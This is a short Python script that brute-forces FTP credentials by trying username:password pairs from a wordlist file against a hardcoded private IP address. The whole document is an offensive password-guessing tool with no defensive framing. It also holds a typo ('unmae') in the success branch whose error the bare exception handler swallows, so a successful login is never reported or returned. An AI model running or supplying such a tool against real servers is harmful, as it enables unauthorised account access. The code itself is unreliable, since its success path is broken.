import ftplib


def brute_login(hostname, pw_fn):
    for line in open(pw_fn):
        uname = line.split(':')[0]
        pw = line.split(':')[1].strip('\r').strip('\n')
        print('[+] Trying: %s/%s' % (uname, pw))
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(uname, pw)
            print('[*] %s FTP logon Succeeded: %s/%s' % (hostname, unmae, pw))
            ftp.quit()
            return (uname, pw)
        except Exception as e:
            # print('[-] %s' % e)
            pass
    print('[-] Could not brute force FTP credentials.')
    return (None, None)


host = '192.168.0.117'
pw_fn = 'userpass.txt'
brute_login(host, pw_fn)
